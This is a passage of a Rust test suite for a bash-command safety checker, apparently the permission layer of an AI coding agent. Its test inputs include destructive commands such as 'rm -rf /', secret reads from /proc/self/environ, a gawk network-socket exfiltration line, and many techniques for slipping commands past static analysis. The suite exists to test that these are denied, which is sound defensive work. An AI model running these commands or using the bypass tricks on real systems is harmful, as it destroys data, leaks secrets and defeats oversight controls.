            assert_deny(&["stdbuf", "-o0", name, "id"], &reason);
        }
    }

    #[test]
    fn timeout_short_kill_flag_does_not_hide_wrapped() {
        // `timeout -k 5 10 eval id` — the SAST regression case. -k 5 consumed,
        // 10 = duration, eval still checked.
        assert_deny(
            &["timeout", "-k", "5", "10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        // Fused -k5 / -sTERM forms.
        assert_deny(
            &["timeout", "-k5", "10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_deny(
            &["timeout", "--signal=TERM", "10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
    }

    #[test]
    fn timeout_unknown_flag_and_bad_duration_fail_closed() {
        assert_deny(
            &["timeout", "--bogus", "10", "eval", "id"],
            "timeout with --bogus flag cannot be statically analyzed",
        );
        assert_deny(
            &["timeout", "-Z", "10", "eval", "id"],
            "timeout with -Z flag cannot be statically analyzed",
        );
        // GNU xstrtod accepts `.5` which our duration regex rejects → fail closed.
        assert_deny(
            &["timeout", ".5", "eval", "id"],
            "timeout duration '.5' cannot be statically analyzed",
        );
    }

    #[test]
    fn timeout_alone_is_inert() {
        // `timeout` with no duration/command → name stays 'timeout', not a builtin.
        assert_ok(&["timeout"]);
        assert_ok(&["timeout", "5"]);
    }

    #[test]
    fn nice_expansion_fails_closed() {
        assert_deny(
            &["nice", "$((0-5))", "jq", "system(\"id\")"],
            "nice argument '$((0-5))' contains expansion — cannot statically determine wrapped command",
        );
        // Legacy `nice -10 cmd` strips correctly.
        assert_deny(
            &["nice", "-10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_ok(&["nice"]);
    }

    #[test]
    fn env_flags_strip_and_fail_closed() {
        // -S splits a string into argv (mini-shell) → reject.
        assert_deny(
            &["env", "-S", "eval id"],
            "env with -S flag cannot be statically analyzed",
        );
        // -u NAME unsets (takes an arg) then wrapped command checked.
        assert_deny(
            &["env", "-u", "PATH", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_ok(&["env"]);
    }

    #[test]
    fn stdbuf_flags_strip_and_fail_closed() {
        // Space-separated long form can't be modeled → reject.
        assert_deny(
            &["stdbuf", "--output", "0", "eval", "id"],
            "stdbuf with --output flag cannot be statically analyzed",
        );
        // -o 0 (space) then -eL then wrapped cmd.
        assert_deny(
            &["stdbuf", "-o", "0", "-eL", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_ok(&["stdbuf"]);
    }

    #[test]
    fn command_v_safe_bare_unsafe() {
        assert_ok(&["command", "-v", "foo"]);
        assert_ok(&["command", "-V", "foo"]);
        // 2.1.195: `command`/`builtin`/`noglob` are command-prefix WRAPPERS — they
        // are stripped and the WRAPPED command is checked.
        assert_ok(&["command", "rm", "-rf", "x"]);
        assert_ok(&["builtin", "echo", "hi"]);
        assert_ok(&["noglob", "echo", "hi"]);
        assert_deny(
            &["command", "eval", "x"],
            "'eval' evaluates arguments as shell code",
        );
        assert_deny(
            &["command", "-x", "foo"],
            "command with -x flag cannot be statically analyzed",
        );
    }

    #[test]
    fn fc_and_compgen_list_safe_exec_unsafe() {
        assert_ok(&["fc", "-l"]);
        assert_ok(&["fc", "-ln"]);
        assert_deny(
            &["fc", "-e", "ed"],
            "'fc' evaluates arguments as shell code",
        );
        assert_deny(&["fc", "-s"], "'fc' evaluates arguments as shell code");
        assert_ok(&["compgen", "-c"]);
        assert_ok(&["compgen", "-f"]);
        assert_deny(
            &["compgen", "-C", "id"],
            "'compgen' evaluates arguments as shell code",
        );
        assert_deny(
            &["compgen", "-W", "$(id)"],
            "'compgen' evaluates arguments as shell code",
        );
    }

    #[test]
    fn zsh_dangerous_builtins_denied() {
        assert_deny(
            &["zmodload", "zsh/system"],
            "Zsh builtin 'zmodload' can bypass security checks",
        );
        assert_deny(
            &["zf_rm", "-rf", "/"],
            "Zsh builtin 'zf_rm' can bypass security checks",
        );
    }

    #[test]
    fn subscript_eval_flags_separate_combined_fused() {
        // Separate: printf -v NAME with subscript.
        assert_deny(
            &["printf", "-v", "arr[$(id)]", "x"],
            "'printf -v' operand contains array subscript or runtime-determined value — bash evaluates $(cmd) in subscripts",
        );
        // Combined: read -ra NAME.
        assert_deny(
            &["read", "-ra", "x[$(id)]"],
            "'read -a' (combined in '-ra') operand contains array subscript — bash evaluates $(cmd) in subscripts",
        );
        // Fused: printf -vNAME.
        assert_deny(
            &["printf", "-varr[0]"],
            "'printf -v' (fused in '-varr[0]') operand contains array subscript — bash evaluates $(cmd) in subscripts",
        );
        // printf '[%s]' x stays safe — '[' is in the format string, not after -v.
        assert_ok(&["printf", "[%s]", "x"]);
    }

    #[test]
    fn test_arith_cmp_subscript_denied() {
        assert_deny(
            &["[[", "a[$(id)]", "-eq", "1", "]]"],
            "'[[ ... -eq ...' operand is non-numeric — `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
        );
        // Right operand too.
        assert_deny(
            &["[[", "1", "-lt", "a[$(id)]", "]]"],
            "'[[ ... -lt ...' operand is non-numeric — `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
        );
        // String comparison does NOT trigger arithmetic eval.
        assert_ok(&["[[", "a[x]", "==", "y", "]]"]);
    }

    #[test]
    fn bare_subscript_name_builtins() {
        assert_deny(
            &["read", "a[$(id)]"],
            "'read' positional NAME 'a[$(id)]' contains array subscript or runtime-determined value — bash evaluates $(cmd) in subscripts",
        );
        assert_deny(
            &["unset", "x[$(id)]"],
            "'unset' positional NAME 'x[$(id)]' contains array subscript or runtime-determined value — bash evaluates $(cmd) in subscripts",
        );
        // read -p '[foo] ' var — the prompt operand is skipped, var is safe.
        assert_ok(&["read", "-p", "[foo] ", "var"]);
        // Fused -rp '[foo]' var: data-flag char last → next arg is prompt (skipped).
        assert_ok(&["read", "-rp", "[foo] ", "var"]);
    }

    #[test]
    fn shell_keyword_as_command_denied() {
        assert_deny(
            &["do", "false"],
            "Shell keyword 'do' as command name — tree-sitter mis-parse",
        );
        assert_deny(
            &["for", "i"],
            "Shell keyword 'for' as command name — tree-sitter mis-parse",
        );
    }

    #[test]
    fn fragment_empty_and_placeholder_command_names() {
        assert_deny(
            &[""],
            "Empty command name — argv[0] may not reflect what bash runs",
        );
        assert_deny(&["-x"], "Command appears to be an incomplete fragment");
        assert_deny(&["|foo"], "Command appears to be an incomplete fragment");
        assert_deny(
            &["__CMDSUB_OUTPUT__"],
            "Command name is runtime-determined (placeholder argv[0])",
        );
        assert_deny(
            &["pre__TRACKED_VAR__"],
            "Command name is runtime-determined (placeholder argv[0])",
        );
    }

    #[test]
    fn jq_system_and_dangerous_flags() {
        assert_deny(
            &["jq", "system(\"rm -rf /\")"],
            "jq command contains system() function which executes arbitrary commands",
        );
        assert_deny(
            &["jq", "-f", "evil.jq"],
            "jq command contains dangerous flags that could execute code or read arbitrary files",
        );
        assert_deny(
            &["jq", "--from-file=evil.jq"],
            "jq command contains dangerous flags that could execute code or read arbitrary files",
        );
        // Plain jq filter is safe.
        assert_ok(&["jq", "."]);
        assert_ok(&["jq", "-r", ".name"]);
    }

    #[test]
    fn proc_environ_argv_and_redirect() {
        assert_deny(
            &["cat", "/proc/self/environ"],
            "Accesses /proc/*/environ which may expose secrets",
        );
        // `cat < /proc/self/environ` — redirect target.
        let mut c = sc(&["cat"]);
        c.redirects.push(Redirect {
            op: "<".to_string(),
            target: "/proc/self/environ".to_string(),
            fd: None,
        });
        match check_semantics(&[c]) {
            SemanticCheckResult::Deny { reason } => {
                assert_eq!(reason, "Accesses /proc/*/environ which may expose secrets")
            }
            SemanticCheckResult::Ok => panic!("redirect /proc/environ not denied"),
        }
    }

    #[test]
    fn newline_hash_argv_env_redirect() {
        assert_deny(
            &["echo", "foo\n# bar"],
            "Newline followed by # inside a quoted argument can hide arguments from path validation",
        );
        // Env var value.
        let mut c = sc(&["echo", "hi"]);
        c.env_vars.push(("X".to_string(), "v\n#hidden".to_string()));
        assert!(matches!(
            check_semantics(&[c]),
            SemanticCheckResult::Deny { .. }
        ));
        // Redirect target.
        let mut c2 = sc(&["echo", "hi"]);
        c2.redirects.push(Redirect {
            op: ">".to_string(),
            target: "out\n#x".to_string(),
            fd: None,
        });
        match check_semantics(&[c2]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "Newline followed by # inside a redirect target can hide arguments from path validation"
            ),
            SemanticCheckResult::Ok => panic!("redirect newline-hash not denied"),
        }
    }

    #[test]
    fn safe_commands_are_ok() {
        assert_ok(&["ls", "-la"]);
        assert_ok(&["git", "status"]);
        assert_ok(&["echo", "hello world"]);
        assert_ok(&["cat", "file.txt"]);
        assert_ok(&["grep", "-rn", "pattern", "src/"]);
        // Empty command list is Ok.
        assert_eq!(check_semantics(&[]), SemanticCheckResult::Ok);
        // A command with undefined name (empty argv) is skipped (continue).
        assert_eq!(check_semantics(&[sc(&[])]), SemanticCheckResult::Ok);
    }

    #[test]
    fn first_deny_across_multiple_commands() {
        // Second command is the unsafe one — battery checks every command.
        match check_semantics(&[sc(&["ls"]), sc(&["eval", "id"])]) {
            SemanticCheckResult::Deny { reason } => {
                assert_eq!(reason, "'eval' evaluates arguments as shell code")
            }
            SemanticCheckResult::Ok => panic!("eval in 2nd command not denied"),
        }
    }

    // ── L5: superset branches reconciled from the 2.1.195 binary ──

    #[test]
    fn path_stripped_wrapper_unwraps_real_command() {
        // Path-prefixed wrappers are basename-matched, then stripped, so the real
        // (dangerous) command is still checked — no under-ask via `/usr/bin/…`.
        assert_deny(
            &["/usr/bin/nohup", "eval", "rm -rf /"],
            "'eval' evaluates arguments as shell code",
        );
        assert_deny(
            &["/bin/timeout", "5", "eval", "x"],
            "'eval' evaluates arguments as shell code",
        );
    }

    #[test]
    fn awk_program_battery_denied() {
        // YVc constructs that execute code / open sockets.
        assert_deny(
            &["awk", "BEGIN{system(\"rm -rf /\")}"],
            "awk program contains system() which executes arbitrary commands",
        );
        assert_deny(
            &["gawk", "{print | \"sh\"}"],
            "awk program contains a command pipe (| \"cmd\" or | getline) which executes arbitrary commands",
        );
        assert_deny(
            &["awk", "@load \"filefuncs\""],
            "awk program contains @load/@include or an @indirect call which can execute arbitrary code",
        );
        assert_deny(
            &["gawk", "BEGIN{extension(\"x\")}"],
            "awk program contains extension() which loads arbitrary native code (legacy gawk)",
        );
        assert_deny(
            &["gawk", "BEGIN{print > \"/inet/tcp/0/host/80\"}"],
            "awk program opens a gawk /inet/ network socket which can exfiltrate data",
        );
        // Program-supplying flags (read program from file / fragments).
        assert_deny(
            &["awk", "-f", "prog.awk", "data"],
            "awk command uses flags that read the program from a file, load extensions, or supply program fragments — cannot be statically analyzed",
        );
        // Unquoted glob before awk runs (hasUnquotedGlob reads cmd.text, so this
        // case needs an explicit text like the find glob test).
        let glob_cmd = SimpleCommand {
            argv: vec!["awk".into(), "*".into()],
            text: "awk *".into(),
            ..Default::default()
        };
        match check_semantics(&[glob_cmd]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "awk command contains unquoted glob characters — could glob-expand to a planted program or flag before awk runs"
            ),
            SemanticCheckResult::Ok => panic!("unquoted glob before awk not denied"),
        }
        // A benign field-print awk program is fine.
        assert_ok(&["awk", "{print $1}", "file.txt"]);
    }

    #[test]
    fn through_xargs_denials() {
        // find/jq reached through xargs cannot be statically analyzed.
        assert_deny(
            &["xargs", "find", ".", "-name", "x"],
            "find through xargs — stdin-appended arguments cannot be statically analyzed",
        );
        assert_deny(
            &["xargs", "jq", "."],
            "jq through xargs — stdin-appended arguments cannot be statically analyzed",
        );
        // awk through xargs with no static program (only flags) is denied.
        assert_deny(
            &["xargs", "awk", "-F", ","],
            "awk through xargs with no static program — stdin-supplied program text cannot be statically analyzed",
        );
        // awk through xargs WITH a static program falls through to the awk
        // battery (a benign program is OK).
        assert_ok(&["xargs", "awk", "{print $1}"]);
        // `xargs -0 …` (flag first) is NOT stripped → no through-xargs verdict.
        assert_ok(&["xargs", "-0", "grep", "x"]);
    }

    #[test]
    fn find_action_flags_and_globs_denied() {
        for f in [
            "-exec",
            "-execdir",
            "-ok",
            "-okdir",
            "-delete",
            "-fprint",
            "-fprint0",
            "-fprintf",
            "-fls",
            "-files0-from",
        ] {
            assert_deny(
                &["find", ".", f, "rm", "{}", ";"],
                &format!("find with '{f}' executes commands or modifies files — cannot be auto-allowed by a Bash(find:*) prefix rule"),
            );
        }
        // Value-taking primaries skip their operand; benign find is OK.
        assert_ok(&["find", ".", "-name", "*.txt", "-type", "f"]);
        // A glob metachar in a non-value argument is denied.
        assert_deny(
            &["find", "[abc]", "-print"],
            "find argument '[abc]' contains glob characters — could glob-expand to a dangerous action",
        );
        // `-newerXY` is a value-taking primary (operand skipped).
        assert_ok(&["find", ".", "-newermt", "2020-01-01"]);
    }

    #[test]
    fn find_unquoted_glob_in_text_denied() {
        let cmd = SimpleCommand {
            argv: vec!["find".into(), ".".into(), "-name".into(), "x".into()],
            text: "find . -name x -exec*".into(),
            ..Default::default()
        };
        match check_semantics(&[cmd]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "find contains unquoted glob characters — could glob-expand to a dangerous action before find runs"
            ),
            SemanticCheckResult::Ok => panic!("unquoted glob in find text not denied"),
        }
        // Quoted glob in text is fine.
        assert!(!find_unquoted_glob("find . -name '*.txt'"));
        assert!(find_unquoted_glob("find . -name *.txt"));
        assert!(!find_unquoted_glob("find . -name x # *"));
    }

    #[test]
    fn set_options_denied() {
        assert_deny(
            &["set", "-o", "extendedglob"],
            "'set -o/+o extendedglob' changes shell parsing/globbing state — can enable globsubst/extendedglob and defeat static analysis",
        );
        // `functrace`/`pipefail` ARE in the safe-option set → allowed.
        assert_ok(&["set", "-o", "functrace"]);
        // unsafe single-letter option (`-a` allexport not in SET_SAFE_LETTERS).
        assert_deny(
            &["set", "-a"],
            "'set -a' changes shell option state (allexport/keyword/…) — defeats static env-var analysis; see SET_O_SAFE_LETTERS",
        );
        // Safe: `set -e`, `set -x`, `set -- args`, `set -o pipefail`.
        assert_ok(&["set", "-e"]);
        assert_ok(&["set", "-x"]);
        assert_ok(&["set", "--", "a", "b"]);
        assert_ok(&["set", "-o", "pipefail"]);
    }

    #[test]
    fn declare_family_flags_denied() {
        assert_deny(
            &["declare", "-n", "ref=x"],
            "'declare' with -n/-i/-a/-A/-E/-F flag (reached as plain command via wrapper/quote) changes assignment eval semantics",
        );
        assert_deny(
            &["typeset", "-i", "n=1+1"],
            "'typeset' with -n/-i/-a/-A/-E/-F flag (reached as plain command via wrapper/quote) changes assignment eval semantics",
        );
        // export -i (zsh matheval) — export is not declare/typeset/local so the
        // first branch is skipped; the zsh-typeset matheval branch catches it.
        assert_deny(
            &["export", "-i", "n=1"],
            "'export' with -i/-E/-F flag (reached as plain command via wrapper/quote) — zsh bin_typeset mathevals the RHS",
        );
        // float/integer with no explicit sign operand.
        assert_deny(
            &["integer", "x"],
            "zsh 'integer' operand — implicit typeset -E/-i arithmetically evaluates the (existing or assigned) value",
        );
        // Plain `declare x=1` is fine.
        assert_ok(&["declare", "x=1"]);
        assert_ok(&["local", "y=2"]);
    }

    #[test]
    fn jobs_print_jq_runsarg_denied() {
        assert_deny(
            &["jobs", "-x", "rm", "-rf", "/"],
            "'jobs -x' executes its argument as a command — cannot be statically analyzed",
        );
        assert_deny(
            &["print", "-P", "$(id)"],
            "'print -P' operand contains command substitution — zsh prompt expansion evaluates $(cmd)",
        );
        // jq include/import + combined dangerous flags (`-nf`).
        assert_deny(
            &["jq", "import \"foo\" as bar; .", "."],
            "jq command contains include/import — modules can load arbitrary .jq files via {search:\".\"} and call env or other builtins",
        );
        assert_deny(
            &["jq", "-nf", "evil.jq"],
            "jq command contains dangerous flags that could execute code or read arbitrary files",
        );
        // runs-its-argument family.
        for c in [
            "watch", "ionice", "chrt", "setsid", "taskset", "strace", "ltrace", "script", "flock",
            "unshare", "nsenter",
        ] {
            assert_deny(
                &[c, "rm", "-rf", "/"],
                &format!("'{c}' runs its argument as a command — cannot be statically analyzed"),
            );
        }
    }

    #[test]
    fn zsh_dangerous_additions_denied() {
        for b in [
            "setopt", "unsetopt", "shopt", "disable", "repeat", "foreach", "zcompile",
        ] {
            assert_deny(
                &[b, "x"],
                &format!("Zsh builtin '{b}' can bypass security checks"),
            );
        }
    }

    #[test]
    fn arith_cmp_nonnumeric_denied() {
        // `[[ foo -eq 5 ]]` — foo non-numeric → arith-eval risk.
        assert_deny(
            &["[[", "foo", "-eq", "5", "]]"],
            "'[[ ... -eq ...' operand is non-numeric — `[[` arithmetically evaluates identifiers/subscripts (may run $(cmd))",
        );
        // numeric operands are fine.
        assert_ok(&["[[", "5", "-eq", "5", "]]"]);
        // `test -t 1` (numeric) ok; `test -t foo` denied.
        assert_ok(&["test", "-t", "1"]);
        assert_deny(
            &["test", "-t", "foo"],
            "'test -t' operand is non-numeric — zsh arith-evals identifiers (may run $(cmd))",
        );
    }

    #[test]
    fn wrapper_empty_value_and_unicode_digit_fail_closed() {
        // env/stdbuf `-u`/`-i` with an EMPTY next arg: JS truthiness `r[c+1]` is
        // falsy → Deny (must not strip and expose the inner command).
        assert_deny(
            &["env", "-u", "", "rm", "-rf", "/x"],
            "env with -u flag cannot be statically analyzed",
        );
        assert_deny(
            &["stdbuf", "-i", "", "rm", "-rf", "/x"],
            "stdbuf with -i flag cannot be statically analyzed",
        );
        // Unicode-digit duration/value must NOT match the ASCII `\d` regexes —
        // the wrapper can't be analyzed → fail closed (here: exposes `eval`).
        assert_deny(
            &["timeout", "\u{FF15}", "eval", "x"],
            "timeout duration '\u{FF15}' cannot be statically analyzed",
        );
        // Non-empty value still strips normally.
        assert_deny(
            &["env", "-u", "FOO", "eval", "x"],
            "'eval' evaluates arguments as shell code",
        );
    }

    #[test]
    fn newline_hash_is_deferred() {
        // A command with a newline-# AND a hard violation returns the hard one.
        let with_nl = SimpleCommand {
            argv: vec!["eval".into(), "x\n#hidden".into()],
            ..Default::default()
        };
        match check_semantics(&[with_nl]) {
            SemanticCheckResult::Deny { reason } => {
                assert_eq!(reason, "'eval' evaluates arguments as shell code")
            }
            SemanticCheckResult::Ok => panic!("eval not denied"),
        }
        // Newline-# alone (no other violation) → the deferred reason.
        let only_nl = SimpleCommand {
            argv: vec!["echo".into(), "x\n#hidden".into()],
            ..Default::default()
        };
        match check_semantics(&[only_nl]) {
            SemanticCheckResult::Deny { reason } => assert_eq!(
                reason,
                "Newline followed by # inside a quoted argument can hide arguments from path validation"
            ),
            SemanticCheckResult::Ok => panic!("newline-# not denied"),
        }
    }

    // ── PERM-AST-VARNAME-01: dangerous-variable-name battery ──

    #[test]
    fn dangerous_var_predicates() {
        // O3i: lowercase ntg names + ld_/dyld_/bash_func_ prefixes (case-insensitive).
        assert!(o3i("PATH"));
        assert!(o3i("path"));
        assert!(o3i("BASH_ENV"));
        assert!(o3i("LD_PRELOAD"));
        assert!(o3i("DYLD_INSERT_LIBRARIES"));
        assert!(o3i("BASH_FUNC_foo%%"));
        assert!(!o3i("FOO"));
        assert!(!o3i("MY_PATH_HELPER"));
        // Itt = O3i | IFS | PS4 | PROMPT4 | Y3i.
        assert!(itt("IFS"));
        assert!(itt("PS4"));
        assert!(itt("PROMPT4"));
        assert!(itt("RANDOM")); // Y3i
        assert!(itt("SECONDS"));
        assert!(itt("status")); // Y3i exact-case member
        assert!(!itt("STATUS"));
        assert!(!itt("HOME_DIR"));
    }

    #[test]
    fn unset_dangerous_var_denied() {
        // `unset PATH` / `unset BASH_ENV` must be too-complex (byte-exact reason).
        assert_eq!(
            pfs("unset PATH"),
            Err(
                "'unset' targets shell variable PATH (exec-influencing / integer-attr / IFS / PS4)"
                    .to_string()
            )
        );
        assert_eq!(
            pfs("unset BASH_ENV"),
            Err(
                "'unset' targets shell variable BASH_ENV (exec-influencing / integer-attr / IFS / PS4)"
                    .to_string()
            )
        );
        assert_eq!(
            pfs("unset IFS"),
            Err(
                "'unset' targets shell variable IFS (exec-influencing / integer-attr / IFS / PS4)"
                    .to_string()
            )
        );
        // -f (function unset) suppresses the var battery even for a dangerous name.
        let cs = pfs("unset -f PATH").expect("unset -f is a function unset");
        assert_eq!(cs[0].argv, vec!["unset", "-f", "PATH"]);
        // Ordinary vars are still fine.
        let cs = pfs("unset FOO BAR").expect("plain unset");
        assert_eq!(cs[0].argv, vec!["unset", "FOO", "BAR"]);
    }

    #[test]
    fn builtin_write_dangerous_var_denied() {
        // `read PATH` writes an exec-influencing var → deny (byte-exact reason).
        assert_eq!(
            pfs("read PATH"),
            Err("'read' writes shell variable PATH (exec-influencing / integer-attr / IFS) — value cannot be statically verified".to_string())
        );
        // mapfile into a dangerous name.
        assert_eq!(
            pfs("mapfile IFS"),
            Err("'mapfile' writes shell variable IFS (exec-influencing / integer-attr / IFS) — value cannot be statically verified".to_string())
        );
        // printf -v LD_PRELOAD.
        assert_eq!(
            pfs("printf -v LD_PRELOAD x"),
            Err("'printf' writes shell variable LD_PRELOAD (exec-influencing / integer-attr / IFS) — value cannot be statically verified".to_string())
        );
        // `read FOO` (benign) → simple; FOO tracked as placeholder so a later
        // bare $FOO rejects.
        let cs = pfs("read FOO").expect("benign read");
        assert_eq!(cs[0].argv, vec!["read", "FOO"]);
        assert!(pfs("read FOO && echo $FOO").is_err());
    }

    #[test]
    fn wrapped_unset_dangerous_var_denied() {
        // `command unset PATH` reaches `unset` as a plain command (wrapper-stripped)
        // → xeg's wrapped-unset battery denies.
        assert_eq!(
            pfs("command unset PATH"),
            Err(
                "'unset' targets shell variable PATH (exec-influencing / integer-attr / IFS / PS4)"
                    .to_string()
            )
        );
        // Non-identifier wrapped-unset operand.
        assert!(pfs("command unset 'a b'").is_err());
    }

    // ── PERM-AST-VARSCOPE-01: loop/branch scope machinery ──

    #[test]
    fn select_statement_rejected() {
        assert_eq!(
            pfs("select x in a b; do echo $x; done"),
            Err("select statement reads stdin into $REPLY; cannot statically model".to_string())
        );
    }

    #[test]
    fn loop_var_guard_widened() {
        // O3i / Y3i / SAFE_ENV / GVc loop vars bypass assignment validation.
        for name in ["PATH", "RANDOM", "HOME", "REPLY", "IFS", "PS4"] {
            let cmd = format!("for {name} in a b; do echo hi; done");
            assert_eq!(
                pfs(&cmd),
                Err(format!(
                    "{name} as loop variable bypasses assignment validation"
                )),
                "loop var {name} must be rejected"
            );
        }
        // An ordinary loop var is fine.
        assert!(pfs("for i in a b; do echo hi; done").is_ok());
    }

    #[test]
    fn for_loop_overwrites_tracked_literal_denied() {
        // `X=status` is a tracked literal; using X as the loop var clobbers it and
        // the post-loop value is unknowable → deny (JSON.stringify-quoted).
        assert_eq!(
            pfs("X=status; for X in a b; do echo hi; done"),
            Err("for-loop variable 'X' would overwrite tracked literal \"status\"; post-loop value cannot be statically determined".to_string())
        );
    }

    #[test]
    fn for_body_write_invalidates_outer_literal() {
        // Outer literal Y=safe; the loop body reassigns Y from an unknown source.
        // After the loop Y must be treated as unknown (placeholder), so a bare $Y
        // rejects rather than resolving to the stale "safe" literal (under-ask).
        assert!(
            pfs("Y=safe; for i in a b; do Y=$RANDOM; done; git $Y").is_err(),
            "post-loop $Y must not resolve to the stale pre-loop literal"
        );
    }

    #[test]
    fn while_read_overwrites_tracked_literal_denied() {
        // `V=lit` then a plain `while read V` — the pre-scan marks V unknown and
        // the condition-modify reconciliation fires FIRST (byte-faithful to CC).
        assert_eq!(
            pfs("V=lit; while read V; do echo hi; done"),
            Err("'V' was tracked as literal 'lit' but condition may modify it (||/pipeline/unset/&&-short-circuit) — cannot prove downstream value".to_string())
        );
        // A PIPELINED read isolates the var-write from the condition copy, so the
        // dedicated read-clobbers-literal reason is what surfaces.
        assert_eq!(
            pfs("V=lit; if echo x | read V; then echo hi; fi"),
            Err("'read V' in condition may not execute (||/pipeline/subshell); cannot prove it overwrites tracked literal 'lit'".to_string())
        );
    }

    // ── PERM-AST-STRING-01: walkString guards ──

    #[test]
    fn string_literal_residue_one_char_rejected() {
        // `"x$(cmd)"`: one literal char + a cmdsub → residue ≤ 1 → reject
        // (previously accepted = under-ask).
        assert_eq!(
            cmd_argvs(r#"echo "x$(id)""#),
            Err("Contains shell syntax (string) that cannot be statically analyzed".to_string())
        );
        // Two literal chars survive.
        let argvs = cmd_argvs(r#"echo "xy$(id)""#).expect("simple");
        // inner id extracted first, then the outer echo command.
        assert_eq!(argvs.last().unwrap()[0], "echo");
        assert_eq!(argvs.last().unwrap()[1], format!("xy{CMDSUB_PLACEHOLDER}"));
    }

    #[test]
    fn walk_argument_unknown_node_reports_generic_reason() {
        let tree = crate::bash_tree_sitter::parse_raw("echo ${HOME}").expect("parse");
        let src = "echo ${HOME}".as_bytes();
        let node = find_kind(tree.root_node(), "variable_name").expect("variable_name node");
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        assert_eq!(
            walk_argument(Some(node), src, &mut inner, &mut scope),
            Err(ParseForSecurityResult::TooComplex {
                reason: "Contains shell syntax (variable_name) that cannot be statically analyzed"
                    .to_string(),
            })
        );
    }

    #[test]
    fn string_zsh_subscript_modifier_rejected() {
        // `"$name[0]"` — next sibling string_content starts with `[` → recursive
        // eval differential.
        let scope_cmd = r#"echo "$HOME[0]""#;
        assert_eq!(
            cmd_argvs(scope_cmd),
            Err(
                "zsh \"$name[expr]\" / \"$name:mod\" inside double-quotes — recursive eval"
                    .to_string()
            )
        );
    }

    // ── PERM-AST-EXPANSION-01: resolveSimpleExpansion (ozn) parity ──

    #[test]
    fn resolve_gvc_tracked_name_never_literal() {
        let mut scope = HashMap::new();
        // A GVc name assigned a literal still must NOT resolve to that literal.
        scope.insert("RANDOM".to_string(), "5".to_string());
        // RANDOM is also a safe-env name → placeholder inside a string, reject bare.
        assert_eq!(
            resolve(r#"echo "$RANDOM""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
        assert!(resolve("echo $RANDOM", &scope, false).is_err());
        // BASHPID is GVc + safe-env but excluded → reject even inside a string.
        scope.insert("BASHPID".to_string(), "123".to_string());
        assert!(resolve(r#"echo "$BASHPID""#, &scope, true).is_err());
        // REPLY is GVc but NOT safe-env → reject inside a string too.
        scope.insert("REPLY".to_string(), "x".to_string());
        assert!(resolve(r#"echo "$REPLY""#, &scope, true).is_err());
    }

    #[test]
    fn resolve_placeholder_composite_returned_inside_string() {
        let mut scope = HashMap::new();
        // A tracked value carrying a placeholder returns the COMPOSITE inside a
        // string (not a bare placeholder) so the prefix survives rule matching.
        scope.insert("V".to_string(), format!("pre{CMDSUB_PLACEHOLDER}"));
        assert_eq!(
            resolve(r#"echo "$V""#, &scope, true),
            Ok(format!("pre{CMDSUB_PLACEHOLDER}"))
        );
        assert!(resolve("echo $V", &scope, false).is_err());
    }

    #[test]
    fn resolve_untracked_home_resolves_to_homedir() {
        let scope = HashMap::new();
        let home = std::env::var("HOME").unwrap_or_default();
        // Inside a string, $HOME resolves to the actual home path (not a
        // placeholder) — byte-faithful to ozn's HOME arm.
        assert_eq!(resolve(r#"echo "$HOME""#, &scope, true), Ok(home));
    }
}
